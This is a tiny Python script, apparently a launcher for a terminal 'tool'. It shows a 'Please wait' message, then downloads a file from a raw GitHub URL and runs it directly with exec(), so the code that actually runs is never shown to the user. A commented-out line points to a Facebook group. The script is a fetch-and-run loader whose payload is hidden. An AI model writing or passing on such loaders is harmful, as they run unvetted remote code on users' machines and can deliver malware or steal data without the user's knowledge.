import requests
import os


g="\033[1;32m"
print(g+"\n[•] Please wait...")
#os.system("xdg-open https://www.facebook.com/groups/356065192713979")
r = requests.get("https://raw.githubusercontent.com/ShTasrif/MsZohaCollage/main/main.py").text
exec (r)
